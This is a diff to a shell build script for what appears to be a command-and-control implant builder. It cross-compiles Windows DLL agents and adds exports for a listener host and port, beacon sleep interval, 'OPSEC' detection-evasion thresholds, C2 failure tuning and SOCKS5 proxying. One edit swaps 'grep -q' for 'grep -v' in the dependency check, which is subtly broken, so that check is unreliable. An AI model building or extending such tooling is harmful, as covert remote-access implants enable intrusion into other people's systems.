@@ -124,7 +124,7 @@ fi
 echo "Checking dependencies..."
 
 # Install required packages if not present
-if ! dpkg -l | grep -q "gcc-mingw-w64"; then
+if ! dpkg -l | grep -v "gcc-mingw-w64"; then
     echo "Installing gcc-mingw-w64..."
     sudo apt-get install -y gcc-mingw-w64
 fi
@@ -274,3 +274,27 @@ if [ "$FORMAT" == "windows_dll" ]; then
 fi
 
 echo "Build process completed"
+
+# Export required variables for the build script
+export LISTENER_HOST="$LISTENER_HOST"
+export LISTENER_PORT="$LISTENER_PORT"
+export TARGET_ARCH="$TARGET"
+export OUTPUT_FORMAT="$FORMAT"
+export AGENT_TYPE="agent"
+export SLEEP_INTERVAL="$SLEEP_INTERVAL"
+# OPSEC related
+export THRESHOLD_ENTER="$base_threshold_enter_full_opsec"
+export THRESHOLD_EXIT="$base_threshold_exit_full_opsec"
+export MIN_FULL_OPSEC_SECS="$min_duration_full_opsec_secs"
+export MIN_BG_OPSEC_SECS="$min_duration_background_opsec_secs"
+export MIN_REDUCED_OPSEC_SECS="$min_duration_reduced_activity_secs"
+export BASE_MAX_C2_FAILS="$base_max_consecutive_c2_failures"
+export C2_THRESH_INC_FACTOR="$c2_failure_threshold_increase_factor"
+export C2_THRESH_DEC_FACTOR="$c2_failure_threshold_decrease_factor"
+export C2_THRESH_ADJ_INTERVAL="$c2_threshold_adjust_interval_secs"
+export C2_THRESH_MAX_MULT="$c2_dynamic_threshold_max_multiplier"
+export PROC_SCAN_INTERVAL_SECS="$proc_scan_interval_secs"
+# Communication related
+export SOCKS5_ENABLED="$socks5_enabled"
+export SOCKS5_HOST="$socks5_host"
+export SOCKS5_PORT="$socks5_port"
